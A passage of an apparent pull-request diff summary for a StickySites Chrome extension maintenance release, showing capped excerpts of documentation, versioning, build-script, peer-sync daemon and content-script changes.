... [diff excerpt capped; 51 further lines in Git]
```

### docs/INSTALLATION.md

```diff
diff --git a/docs/INSTALLATION.md b/docs/INSTALLATION.md
index b4da092..8bc76de 100644
--- a/docs/INSTALLATION.md
+++ b/docs/INSTALLATION.md
@@ -8,3 +8,3 @@
 - Git
-- Node.js ≥ 22 — only for running tests and tooling
+- Node.js matching `.nvmrc` and `package.json` engines — only for tests and tooling
 
@@ -17,3 +17,3 @@
    ```
-2. (Optional, tests/tooling) `npm install && npm run lint && npm test`
... [diff excerpt capped; 14 further lines in Git]
```

### docs/MCP.md

```diff
diff --git a/docs/MCP.md b/docs/MCP.md
index 835bf12..0808ee9 100644
--- a/docs/MCP.md
+++ b/docs/MCP.md
@@ -2,36 +2,31 @@
 
-## Servers shipped by this repo
+## Shipped runtime
 
-**None.** StickySites is a Chrome extension with no server process, so it exposes no
-Model Context Protocol tools and has no MCP-facing operations registry. The
-`server/src/lib/operations-registry.js` + `tam_ops_*` tool contract from the mdb-tam
... [diff excerpt capped; 50 further lines in Git]
```

### docs/SECURITY.md

```diff
diff --git a/docs/SECURITY.md b/docs/SECURITY.md
index 10a747b..7bdc04e 100644
--- a/docs/SECURITY.md
+++ b/docs/SECURITY.md
@@ -6,3 +6,4 @@ StickySites runs as a Chrome Extension on every web page. It injects DOM into un
 pages, stores user notes locally with optional encryption, and (optionally) exchanges the
-to-do list with a local native-messaging host. There is no network surface.
+to-do list with a local native-messaging host. An optional daemon exposes loopback HTTP
+and authenticated LAN HTTPS/UDP discovery, and can use a shared/cloud folder.
 
@@ -14,5 +15,6 @@ to-do list with a local native-messaging host. There is no network surface.
 | Host page spoofs `#stickysites-cluster` to suppress injection | Low | Denial of the UI only; no data exposure. |
... [diff excerpt capped; 82 further lines in Git]
```

### docs/TESTING.md

```diff
diff --git a/docs/TESTING.md b/docs/TESTING.md
index d56d7b9..c9b4835 100644
--- a/docs/TESTING.md
+++ b/docs/TESTING.md
@@ -2,82 +2,95 @@
 
-## Framework and commands
+## Commands
 
-[Vitest](https://vitest.dev/) 5.x, node environment, `globals: true` (`vitest.config.mjs`).
+Use the Node version in `.nvmrc` that satisfies `package.json` engines, then `npm ci`.
 
... [diff excerpt capped; 164 further lines in Git]
```

### docs/caching-and-optimization.md

```diff
diff --git a/docs/caching-and-optimization.md b/docs/caching-and-optimization.md
index e79a99c..f35e897 100644
--- a/docs/caching-and-optimization.md
+++ b/docs/caching-and-optimization.md
@@ -10,5 +10,8 @@
 | `Panel._lastWrittenBody` | The HTML this panel last saved | Used by `syncFromStorage` to skip its own echo from `chrome.storage.onChanged` |
+| Daemon peer ETags | Last fetched snapshot per authenticated peer | A changed ETag fetches fresh content; pairing-key rotation clears trust/cache |
+| Daemon folder cache | File docs keyed by mtime and size; last published snapshot etag | Folder/key/name changes invalidate publication; writes serialize with signing config |
 | Popup `loadAllNotes()` result | Decrypted list of every note | Re-read on every popup open; no persistence |
 
-There is no HTTP cache, CDN, or database — all data is `chrome.storage.local`.
+The extension has no CDN or hosted database. It stores data in `chrome.storage.local`;
... [diff excerpt capped; 9 further lines in Git]
```

### docs/code-deep-optimizer-2026-11-12.md

Generated/metadata artifact; full delivered diff is retained by Git. audit record: validation/coverage metadata, excluded from public guide concatenation.

### docs/external-calls.md

```diff
diff --git a/docs/external-calls.md b/docs/external-calls.md
index f180db4..f9bf194 100644
--- a/docs/external-calls.md
+++ b/docs/external-calls.md
@@ -2,8 +2,6 @@
 
-StickySites makes **no internet calls**. Everything stays in `chrome.storage.local`. Two optional
-calls leave the browser, both to processes on the same machine: the to-do sync with a
-native-messaging host, and the loopback HTTP calls to the local peer-sync daemon (which in turn
-talks only to the user's paired machines on the LAN). Chrome-internal APIs (`chrome.storage`, `chrome.tabs`, `chrome.windows`,
-`chrome.alarms`, `chrome.contextMenus`) never leave the browser and are inventoried in
-`integrations-and-assumptions.md`, not here.
... [diff excerpt capped; 152 further lines in Git]
```

### docs/integrations-and-assumptions.md

```diff
diff --git a/docs/integrations-and-assumptions.md b/docs/integrations-and-assumptions.md
index 69a22fa..ed4677a 100644
--- a/docs/integrations-and-assumptions.md
+++ b/docs/integrations-and-assumptions.md
@@ -4,4 +4,4 @@
 
-StickySites makes **no network calls**. Its integrations are browser APIs plus one optional
-local process.
+StickySites has no hosted telemetry. Its optional boundaries are a local native host,
+loopback daemon, paired LAN peers, and a shared/cloud folder selected by the user.
 
@@ -9,7 +9,8 @@ local process.
... [diff excerpt capped; 51 further lines in Git]
```

### docs/known-issues.md

```diff
diff --git a/docs/known-issues.md b/docs/known-issues.md
index 66b5915..729db5f 100644
--- a/docs/known-issues.md
+++ b/docs/known-issues.md
@@ -19,4 +19,4 @@ reloads. Workaround: reload the page after updating. Files: `sticky-inject.js`.
 **Impact**: Low (UX) · **Status**: By design
-600,000 iterations take 1–4 s on slow hardware; the unlock button appears to hang.
-Workaround: wait. Fix: spinner / "Unlocking…" state in the lock overlay and popup lock screen.
+PBKDF2 duration depends on the hardware. The popup shows "Unlocking…" while it works;
+the in-page overlay has no detailed progress indicator. Wait for its result before retrying.
 Files: `sticky-inject.js` (`showLockOverlay`), `popup.js`.
@@ -31,12 +31,11 @@ when leaving the machine. Files: `crypto-content.js`, `popup.js`.
... [diff excerpt capped; 55 further lines in Git]
```

### docs/logging.md

```diff
diff --git a/docs/logging.md b/docs/logging.md
index 967074e..995f9ff 100644
--- a/docs/logging.md
+++ b/docs/logging.md
@@ -2,70 +2,49 @@
 
-## Approach
+## Sinks and levels
 
-StickySites has **no logging framework and no log sink outside the browser**. There is no
-server, no file, and no remote service. Diagnostics are the browser's own consoles:
+The extension uses browser consoles rather than a logging framework or hosted telemetry.
... [diff excerpt capped; 99 further lines in Git]
```

### docs/maintenance-coverage-2026-11-12.json

Generated/metadata artifact; full delivered diff is retained by Git. audit record: validation/coverage metadata, excluded from public guide concatenation.

### docs/onboarding.md

```diff
diff --git a/docs/onboarding.md b/docs/onboarding.md
index 3dd0c2a..08b89da 100644
--- a/docs/onboarding.md
+++ b/docs/onboarding.md
@@ -2,3 +2,3 @@
 
-From zero to a merged change in about ten minutes.
+A path from checkout through a verified change.
 
@@ -9,3 +9,3 @@ git clone https://github.com/mithudso/stickysites.git
 cd stickysites
-npm install
... [diff excerpt capped; 28 further lines in Git]
```

### docs/repo-bootstrap-audit-2026-11-12.md

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/repo-bootstrap-audit-2026-11-12.md b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/repo-bootstrap-audit-2026-11-12.md
new file mode 100644
index 0000000..2d3243e
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/repo-bootstrap-audit-2026-11-12.md
@@ -0,0 +1,112 @@
+# Repository bootstrap audit — 2026-11-12
+
+Repository: `mithudso/stickysites`. Baseline: `a4dc8246a9faa9743539ddbf20dd2810113b9e11`.
+This audit accompanies the 1.13.1 maintenance change. The dated optimizer report and
+coverage ledger account for executable review, findings, tests, exclusions, and rollback.
+
... [diff excerpt capped; 106 further lines in Git]
```

### docs/requirements.md

```diff
diff --git a/docs/requirements.md b/docs/requirements.md
index 1ee672e..b065bc9 100644
--- a/docs/requirements.md
+++ b/docs/requirements.md
@@ -47,4 +47,8 @@
 - Storage keys versioned `_v1`; legacy shapes adapted at read time
-- Data never leaves the device except the optional local to-do host
-- Unit tests for every shared/pure module; CI: lint, test, index check, manifest validation
+- No hosted telemetry. Optional sync may send data to a local host, paired LAN computers,
+  or a user-selected shared/cloud folder; metadata remains plaintext even with the vault on.
+- Runtime mutations use one service-worker queue with fresh reads, guarded commits, and
+  persisted-value verification. Vault transitions stage all buckets before a commit.
... [diff excerpt capped; 22 further lines in Git]
```

### docs/runbooks/encryption-lock-and-recovery.md

```diff
diff --git a/docs/runbooks/encryption-lock-and-recovery.md b/docs/runbooks/encryption-lock-and-recovery.md
index ecd2f5f..789174c 100644
--- a/docs/runbooks/encryption-lock-and-recovery.md
+++ b/docs/runbooks/encryption-lock-and-recovery.md
@@ -2,3 +2,3 @@
 
-Vault design: `docs/SECURITY.md`. Code: `src/content/crypto-content.js`, popup Settings.
+Vault design: `docs/SECURITY.md`. Code: `src/content/crypto-content.js`, `src/shared/note-writer.js`, popup Settings.
 
@@ -9,4 +9,4 @@ Vault design: `docs/SECURITY.md`. Code: `src/content/crypto-content.js`, popup S
 
-Popup → Settings → **Lock Now**. This removes `stickysites_cached_key` and clears the
... [diff excerpt capped; 27 further lines in Git]
```

### docs/runbooks/load-and-reload-extension.md

```diff
diff --git a/docs/runbooks/load-and-reload-extension.md b/docs/runbooks/load-and-reload-extension.md
index 975314f..1395c95 100644
--- a/docs/runbooks/load-and-reload-extension.md
+++ b/docs/runbooks/load-and-reload-extension.md
@@ -2,3 +2,5 @@
 
-**Precondition**: repo checked out; `npm run lint && npm test` green.
+**Precondition**: an explicitly requested live browser check, a checked-out repo, and
+passing automated checks. This runbook is not a requirement to activate an extension during
+automated maintenance; use an isolated test profile and preserve active user sessions.
 
```

### docs/runbooks/peer-sync.md

```diff
diff --git a/docs/runbooks/peer-sync.md b/docs/runbooks/peer-sync.md
index 9fdd38b..6823910 100644
--- a/docs/runbooks/peer-sync.md
+++ b/docs/runbooks/peer-sync.md
@@ -7,3 +7,4 @@ helper (`peer/stickysites-peer.py`). Design and security model: `peer/README.md`
 multicast or subnet broadcast allowed (the daemon uses both; guest networks with client isolation
-block both — configure `--peer IP` on each side, see `peer/README.md`).
+may also block direct peer traffic. Static IPs help only when unicast is allowed;
+otherwise use a shared/cloud folder, see `peer/README.md`).
 
@@ -13,3 +14,3 @@ block both — configure `--peer IP` on each side, see `peer/README.md`).
    ```bash
... [diff excerpt capped; 24 further lines in Git]
```

### docs/runbooks/release-packaging.md

```diff
diff --git a/docs/runbooks/release-packaging.md b/docs/runbooks/release-packaging.md
index 0839d16..4647199 100644
--- a/docs/runbooks/release-packaging.md
+++ b/docs/runbooks/release-packaging.md
@@ -9,4 +9,4 @@ version (`npm run lint` enforces this); `memory.md` / `prompts.md` updated.
    ```bash
-   # example: 1.13.0
-   sed -i '' 's/"version": "[0-9.]*"/"version": "1.13.0"/' manifest.json package.json
+   npm version <new-version> --no-git-tag-version
+   # Set manifest.json to the same version; review the diff.
    npm run lint
@@ -14,6 +14,7 @@ version (`npm run lint` enforces this); `memory.md` / `prompts.md` updated.
... [diff excerpt capped; 20 further lines in Git]
```

### docs/runbooks/todo-sync-troubleshooting.md

```diff
diff --git a/docs/runbooks/todo-sync-troubleshooting.md b/docs/runbooks/todo-sync-troubleshooting.md
index 6f05a79..94e5b4f 100644
--- a/docs/runbooks/todo-sync-troubleshooting.md
+++ b/docs/runbooks/todo-sync-troubleshooting.md
@@ -7,3 +7,4 @@ list stays local.
 
-**Precondition**: the `todo` skill is present at `~/.claude/skills/todo/`.
+**Precondition**: live native-host troubleshooting is in scope and the `todo` skill is
+present at `~/.claude/skills/todo/`. Automated maintenance uses synthetic replies instead.
 
@@ -30,3 +31,3 @@ list stays local.
    host is forbidden`, …).
... [diff excerpt capped; 10 further lines in Git]
```

### docs/wiki/index.md

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/wiki/index.md b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/wiki/index.md
new file mode 100644
index 0000000..28ef18f
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/wiki/index.md
@@ -0,0 +1,20 @@
+# StickySites documentation
+
+StickySites is a browser extension with optional local native messaging and a Python peer
+helper. There is no hosted application server or shipped MCP server.
+
+| Need | Start here |
... [diff excerpt capped; 14 further lines in Git]
```

### eslint.config.mjs

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/eslint.config.mjs b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/eslint.config.mjs
new file mode 100644
index 0000000..be20df9
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/eslint.config.mjs
@@ -0,0 +1,25 @@
+// Semantic errors only. Syntax remains a separate gate for every maintained JS file.
+export default [
+  { ignores: ['node_modules/**', 'coverage/**', 'dist/**', 'docs/**', '.git/**', '.remember/**'] },
+  {
+    files: ['**/*.js', '**/*.mjs'],
+    languageOptions: { ecmaVersion: 'latest', sourceType: 'module' },
... [diff excerpt capped; 19 further lines in Git]
```

### manifest.json

```diff
diff --git a/manifest.json b/manifest.json
index 39be24b..3d19206 100644
--- a/manifest.json
+++ b/manifest.json
@@ -3,3 +3,3 @@
   "name": "StickySites",
-  "version": "1.13.0",
+  "version": "1.13.1",
   "description": "Sticky notes for every website. Global notes, per-site notes, and per-page notes in a floating workspace.",
@@ -38,2 +38,6 @@
       "js": [
+        "src/shared/settings.js",
... [diff excerpt capped; 4 further lines in Git]
```

### memory.md

```diff
diff --git a/memory.md b/memory.md
index eb20f28..b7dd59c 100644
--- a/memory.md
+++ b/memory.md
@@ -2,2 +2,10 @@
 
+## v1.13.1 - 2026-11-12T10:13:30Z
+
+- Active task: repository bootstrap and full code optimizer maintenance for StickySites.
+- Completed: isolated task checkout; baseline and per-file review; vault/storage/sync/UI/daemon/tooling fixes; runtime DOM and disposable daemon regressions; current privacy, operations, developer guides; versioned dependency and CI updates.
+- In progress: final independent reviews, generated documentation checks, and verified GitHub delivery.
+- Next steps: resolve corroborated review findings, pass final checks, deliver through a PR, verify remote main and safely synchronize the primary checkout.
... [diff excerpt capped; 3 further lines in Git]
```

### package-lock.json

Generated/metadata artifact; full delivered diff is retained by Git. generated lockfile: dependency graph, npm installation and audit verification.

### package.json

```diff
diff --git a/package.json b/package.json
index bab0861..f46685e 100644
--- a/package.json
+++ b/package.json
@@ -3,6 +3,6 @@
   "private": true,
-  "version": "1.13.0",
+  "version": "1.13.1",
   "description": "Sticky notes for every website \u2014 global, site, page, daily, todo, and outline notes with rich text, encryption, and sync",
   "engines": {
-    "node": ">=22"
+    "node": "^22.22.2 || ^24.15.0 || >=26.0.0"
... [diff excerpt capped; 20 further lines in Git]
```

### peer/README.md

```diff
diff --git a/peer/README.md b/peer/README.md
index 72ee063..e1f4315 100644
--- a/peer/README.md
+++ b/peer/README.md
@@ -2,4 +2,4 @@
 
-Keeps two or more laptops' StickySites notes converged **over the local network only** — no
-account, no cloud, no server. A tiny Python daemon (stdlib only, Python 3.9+) runs on each
+Keeps two or more laptops' StickySites notes converged over a paired LAN or a shared/cloud
+folder you select, without a hosted StickySites service. A tiny Python daemon (stdlib only, Python 3.9+) runs on each
 machine; the extension talks to it on loopback, the daemons talk to each other on the LAN.
@@ -20,6 +20,6 @@ laptop A                                             laptop B
... [diff excerpt capped; 63 further lines in Git]
```

### peer/peer_fixture.py

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/peer/peer_fixture.py b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/peer/peer_fixture.py
new file mode 100644
index 0000000..e3ec480
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/peer/peer_fixture.py
@@ -0,0 +1,166 @@
+"""Synthetic actual-daemon fixture: temporary state and loopback-only dynamic sockets."""
+import importlib.util
+import atexit
+import json
+import os
+import shutil
... [diff excerpt capped; 160 further lines in Git]
```

### peer/stickysites-peer.py

```diff
diff --git a/peer/stickysites-peer.py b/peer/stickysites-peer.py
index 89c154e..2ebdf42 100755
--- a/peer/stickysites-peer.py
+++ b/peer/stickysites-peer.py
@@ -23,4 +23,5 @@ Local Peer Sync); the daemon applies them live and writes them back to peer.json
 """
-import argparse, errno, hashlib, hmac, http.client, json, os, secrets, socket, ssl, subprocess, sys, threading, time, urllib.request
+import argparse, errno, hashlib, hmac, http.client, json, os, secrets, socket, ssl, stat, subprocess, sys, tempfile, threading, time, urllib.request
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from urllib.parse import urlsplit
 
@@ -38,2 +39,12 @@ IFACE_RESCAN = 60      # seconds between interface re-enumerations (VPN up/down,
... [diff excerpt capped; 661 further lines in Git]
```

### peer/test_peer.py

```diff
diff --git a/peer/test_peer.py b/peer/test_peer.py
index 807941f..d71d77d 100644
--- a/peer/test_peer.py
+++ b/peer/test_peer.py
@@ -1,12 +1,19 @@
-"""End-to-end test: two daemons on one box (different ports, same pairing key, multicast loopback)
-discover each other and exchange a snapshot. Run: python3 -m unittest peer/test_peer.py"""
-import json, os, shutil, subprocess, sys, tempfile, time, unittest, urllib.request
+"""Actual peer integration and regression tests. Run: python3 -m unittest peer/test_peer.py"""
+import concurrent.futures
+import copy
+import hashlib
... [diff excerpt capped; 655 further lines in Git]
```

### popout.html

```diff
diff --git a/popout.html b/popout.html
index d443986..9959cd4 100644
--- a/popout.html
+++ b/popout.html
@@ -9,2 +9,6 @@
 <body>
+  <script src="src/shared/settings.js"></script>
+  <script src="src/shared/network.js"></script>
+  <script src="src/content/storage-content.js"></script>
+  <script src="src/content/safe-html.js"></script>
   <script src="src/content/crypto-content.js"></script>
```

### popout.js

```diff
diff --git a/popout.js b/popout.js
index 195e96b..e4d32f1 100644
--- a/popout.js
+++ b/popout.js
@@ -34,8 +34,19 @@
   });
-  Panel.open(noteType);
-
-  // The popout window is resized by the OS; strip every in-page resize grip.
-  document.querySelectorAll('.stickysites-panel-resize').forEach(function (grip) {
-    grip.remove();
+  var generation = 0;
... [diff excerpt capped; 17 further lines in Git]
```

### popup.css

```diff
diff --git a/popup.css b/popup.css
index d903500..a53bef7 100644
--- a/popup.css
+++ b/popup.css
@@ -128,2 +128,4 @@ body {
 #tag-filters {
+  max-height: 96px;
+  overflow-y: auto;
   display: flex;
@@ -148,2 +150,3 @@ body {
 #notes-list {
+  min-height: 80px;
... [diff excerpt capped; 7 further lines in Git]
```

### popup.html

```diff
diff --git a/popup.html b/popup.html
index c479566..dddc73f 100644
--- a/popup.html
+++ b/popup.html
@@ -20,3 +20,3 @@
     <div id="search-bar">
-      <input type="text" id="search-input" placeholder="Search notes...">
+      <input type="text" id="search-input" aria-label="Search notes" placeholder="Search notes...">
     </div>
@@ -44,2 +44,7 @@
   </div>
+  <script src="src/shared/settings.js"></script>
... [diff excerpt capped; 5 further lines in Git]
```

### popup.js

```diff
diff --git a/popup.js b/popup.js
index 3574217..9d943b4 100644
--- a/popup.js
+++ b/popup.js
@@ -12,2 +12,5 @@
   var Crypto = window.StickySites?.Crypto || null;
+  var Prefs = window.StickySites.Prefs;
+  var controlsBound = false;
+  var unlockOnly = new URLSearchParams(location.search).get('unlock') === '1';
 
@@ -15,2 +18,4 @@
     allNotes: [],
... [diff excerpt capped; 451 further lines in Git]
```

### prompts.md

```diff
diff --git a/prompts.md b/prompts.md
index 48402b2..5168da9 100644
--- a/prompts.md
+++ b/prompts.md
@@ -2,2 +2,7 @@
 
+## Prompt v1.13.1 - 2026-11-12T10:13:30Z
+
+- User request:
+  - Execute repo-bootstrapper and the full code-deep-optimizer workflow only for StickySites. Preserve others' work, use bounded local per-file reviewers, and deliver final verified changes through passing GitHub checks and merge. Keep live services and semantic indexing inactive.
+
 ## Prompt v1.13.0 - 2026-09-28T02:20:00-04:00
```

### scripts/browser-checks.mjs

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/browser-checks.mjs b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/browser-checks.mjs
new file mode 100644
index 0000000..9c8541c
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/browser-checks.mjs
@@ -0,0 +1,50 @@
+/** Side-effect-free checks shared by opt-in browser harnesses and synthetic tests. */
+export const NOTE_BUCKETS = ['stickysites_global_v1', 'stickysites_sites_v1', 'stickysites_pages_v1', 'stickysites_todos_v1', 'stickysites_outlines_v1', 'stickysites_daily_v1'];
+
+export function populatedNoteBuckets(store) {
+  return NOTE_BUCKETS.filter(key => store[key] && typeof store[key] === 'object' && Object.keys(store[key]).length > 0);
+}
... [diff excerpt capped; 44 further lines in Git]
```

### scripts/build-store-zip.mjs

```diff
diff --git a/scripts/build-store-zip.mjs b/scripts/build-store-zip.mjs
index 08bc92e..48ca8ed 100644
--- a/scripts/build-store-zip.mjs
+++ b/scripts/build-store-zip.mjs
@@ -9,3 +9,3 @@
 import { execFileSync } from 'node:child_process';
-import { existsSync, mkdirSync, readFileSync, rmSync, statSync } from 'node:fs';
+import { existsSync, mkdirSync, readFileSync, rmSync, statSync, lstatSync, readdirSync } from 'node:fs';
 import path from 'node:path';
@@ -31,8 +31,29 @@ if (existsSync(zipPath)) rmSync(zipPath);
 
-execFileSync('zip', ['-r', '-X', zipPath, ...INCLUDE, '-x', '*.DS_Store', '-x', '*/.DS_Store'], { cwd: repoRoot, stdio: 'ignore' });
... [diff excerpt capped; 29 further lines in Git]
```

### scripts/check-doc-indexes.mjs

```diff
diff --git a/scripts/check-doc-indexes.mjs b/scripts/check-doc-indexes.mjs
index 2a7d847..55fda37 100644
--- a/scripts/check-doc-indexes.mjs
+++ b/scripts/check-doc-indexes.mjs
@@ -1,20 +1,4 @@
 #!/usr/bin/env node
-/**
- * Path-validates the LLM retrieval indexes so they can never rot silently:
- *
- *   docs/high_signal_file_index.json  — every entry's `path` must exist on disk
- *   llms.txt                          — every relative markdown link must exist on disk
- *
... [diff excerpt capped; 180 further lines in Git]
```

### scripts/check-syntax.mjs

```diff
diff --git a/scripts/check-syntax.mjs b/scripts/check-syntax.mjs
index e998c94..c3fe221 100644
--- a/scripts/check-syntax.mjs
+++ b/scripts/check-syntax.mjs
@@ -1,16 +1,11 @@
 #!/usr/bin/env node
-/**
- * Syntax gate for a repo with no bundler and no transpiler: runs `node --check` over every
- * JavaScript file Chrome or Node will load, so a stray brace in a content script fails CI
- * instead of silently breaking the extension on every page.
- *
- * Node 22.7+ detects ESM vs classic syntax per file, so both the `import`-style shared modules
... [diff excerpt capped; 113 further lines in Git]
```

### scripts/generate-docs.mjs

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/generate-docs.mjs b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/generate-docs.mjs
new file mode 100644
index 0000000..7ff0407
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/generate-docs.mjs
@@ -0,0 +1,193 @@
+#!/usr/bin/env node
+/** Deterministic text-only documentation inventory. No semantic index or embedding calls. */
+import { execFileSync } from 'node:child_process';
+import { existsSync, lstatSync, mkdirSync, readFileSync, realpathSync, writeFileSync } from 'node:fs';
+import path from 'node:path';
+import { fileURLToPath } from 'node:url';
... [diff excerpt capped; 187 further lines in Git]
```

### scripts/harness-resources.mjs

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/harness-resources.mjs b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/harness-resources.mjs
new file mode 100644
index 0000000..4959f2e
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/harness-resources.mjs
@@ -0,0 +1,99 @@
+/** Owned-resource lifecycle for the opt-in browser harnesses. Importing starts nothing. */
+import fs from 'node:fs';
+import os from 'node:os';
+import path from 'node:path';
+
+export function resolveChrome({ env = process.env, home = os.homedir(), platform = process.platform } = {}) {
... [diff excerpt capped; 93 further lines in Git]
```

### scripts/rotate-workflow-logs.mjs

```diff
diff --git a/scripts/rotate-workflow-logs.mjs b/scripts/rotate-workflow-logs.mjs
index a561091..a626cab 100644
--- a/scripts/rotate-workflow-logs.mjs
+++ b/scripts/rotate-workflow-logs.mjs
@@ -2,25 +2,14 @@
 /**
- * Size-control for the append-forever workflow logs (memory.md, prompts.md).
- *
- * Both logs are newest-first lists of `## ` version sections. When a log grows
- * past the threshold (~200 KB) this tool moves the OLDEST sections (from the
- * bottom) into docs/archive/<name> until the live log is back under the
- * threshold. The title/preamble above the first `## ` section and at least the
... [diff excerpt capped; 337 further lines in Git]
```

### scripts/store-screenshots.mjs

```diff
diff --git a/scripts/store-screenshots.mjs b/scripts/store-screenshots.mjs
index 0d0919b..bf5da99 100644
--- a/scripts/store-screenshots.mjs
+++ b/scripts/store-screenshots.mjs
@@ -16,7 +16,9 @@ import http from 'node:http';
 import fs from 'node:fs';
-import os from 'node:os';
 import path from 'node:path';
+import { listen, resolveChrome, withHarnessResources } from './harness-resources.mjs';
 import { fileURLToPath } from 'node:url';
 import { createCanvas, loadImage } from 'canvas';
+import { closePanel, openNoteForScreenshot } from './browser-checks.mjs';
... [diff excerpt capped; 84 further lines in Git]
```

### scripts/verify-live.mjs

```diff
diff --git a/scripts/verify-live.mjs b/scripts/verify-live.mjs
index 0ece182..810cd06 100644
--- a/scripts/verify-live.mjs
+++ b/scripts/verify-live.mjs
@@ -5,14 +5,16 @@ import http from 'node:http';
 import fs from 'node:fs';
-import os from 'node:os';
 import path from 'node:path';
+import { listen, resolveChrome, withHarnessResources } from './harness-resources.mjs';
+import { encryptedNoteBuckets, persistedSiteBody, populatedNoteBuckets, restoredNoteContent } from './browser-checks.mjs';
 
-const REPO = process.cwd();
... [diff excerpt capped; 147 further lines in Git]
```

### src/background/service-worker.js

```diff
diff --git a/src/background/service-worker.js b/src/background/service-worker.js
index 95f8b12..974af4f 100644
--- a/src/background/service-worker.js
+++ b/src/background/service-worker.js
@@ -1 +1,3 @@
+import '../content/crypto-content.js';
+import { createNoteWriter } from '../shared/note-writer.js';
 import { syncTodosWithHost, TODOS_KEY } from '../shared/todo-bridge.js';
@@ -4,2 +6,30 @@ import { importJwk, encrypt, decrypt } from '../shared/crypto.js';
 
+const noteWriter = createNoteWriter(chrome.storage.local);
+globalThis.StickySites.Storage = { commit: noteWriter.commit, request: command => noteWriter.dispatch(command) };
... [diff excerpt capped; 94 further lines in Git]
```

### src/content/cluster.js

```diff
diff --git a/src/content/cluster.js b/src/content/cluster.js
index be17316..34ec84a 100644
--- a/src/content/cluster.js
+++ b/src/content/cluster.js
@@ -75,2 +75,13 @@ window.StickySites = window.StickySites || {};
       this._updateCollapseState();
+      this.clampPosition();
+      var self = this;
+      window.addEventListener('resize', function () { self.clampPosition(); });
+    },
+
+    clampPosition: function () {
... [diff excerpt capped; 39 further lines in Git]
```

### src/content/crypto-content.js

```diff
diff --git a/src/content/crypto-content.js b/src/content/crypto-content.js
index bb76b3f..ab5ea49 100644
--- a/src/content/crypto-content.js
+++ b/src/content/crypto-content.js
@@ -1 +1,2 @@
+(function (window) {
 window.StickySites = window.StickySites || {};
@@ -27,2 +28,4 @@ window.StickySites = window.StickySites || {};
     _cachedKey: null,
+    _cacheGeneration: 0,
+    _cachedJwk: null,
 
... [diff excerpt capped; 175 further lines in Git]
```

### src/content/mentions.js

```diff
diff --git a/src/content/mentions.js b/src/content/mentions.js
index 00eadf4..9ca2131 100644
--- a/src/content/mentions.js
+++ b/src/content/mentions.js
@@ -49,2 +49,6 @@ window.StickySites = window.StickySites || {};
     attach: function (editorEl) {
+      if (this._controller) this._controller.abort();
+      this.hide();
+      this._controller = new AbortController();
+      var signal = this._controller.signal;
       this.editorEl = editorEl;
@@ -54,3 +58,3 @@ window.StickySites = window.StickySites || {};
... [diff excerpt capped; 62 further lines in Git]
```

### src/content/outline-ops.js

```diff
diff --git a/src/content/outline-ops.js b/src/content/outline-ops.js
index 217155d..e74fc7f 100644
--- a/src/content/outline-ops.js
+++ b/src/content/outline-ops.js
@@ -149,3 +149,4 @@ window.StickySites = window.StickySites || {};
   // non-stopword, in ≥2 nodes) → keyword-named parents; (c) rest → "Other".
-  // Single-member groups stay ungrouped. Returns a NEW top-level array; child
+  // Single-member tag groups enter keyword grouping, then Other if a group exists.
+  // Returns a NEW top-level array; child
   // subtrees travel with their nodes untouched.
@@ -153,3 +154,3 @@ window.StickySites = window.StickySites || {};
     var top = items.slice();
... [diff excerpt capped; 18 further lines in Git]
```

### src/content/outline.js

```diff
diff --git a/src/content/outline.js b/src/content/outline.js
index e8aff80..ff6c194 100644
--- a/src/content/outline.js
+++ b/src/content/outline.js
@@ -35,5 +35,6 @@ window.StickySites = window.StickySites || {};
     if (raw && C && C.isEncrypted(raw)) {
-      try { raw = await C.decryptValue(raw); } catch { raw = {}; }
-      if (C.isEncrypted(raw)) raw = {}; // still locked / wrong key — treat as empty, never write back
+      raw = await C.decryptValue(raw);
+      if (C.isEncrypted(raw)) throw new Error('VAULT_UNREADABLE');
     }
+    if (!raw || typeof raw !== 'object' || Array.isArray(raw)) throw new Error('NOTE_UNREADABLE');
... [diff excerpt capped; 144 further lines in Git]
```

### src/content/panel.js

```diff
diff --git a/src/content/panel.js b/src/content/panel.js
index 0932460..a96a52e 100644
--- a/src/content/panel.js
+++ b/src/content/panel.js
@@ -32,3 +32,3 @@ window.StickySites = window.StickySites || {};
     if (!body) return '';
-    return isHtml(body) ? body : plainTextToHtml(body);
+    return window.StickySites.Html.sanitize(isHtml(body) ? body : plainTextToHtml(body));
   }
@@ -36,3 +36,3 @@ window.StickySites = window.StickySites || {};
   function getPlainText(editorEl) {
-    return editorEl.textContent || editorEl.innerText || '';
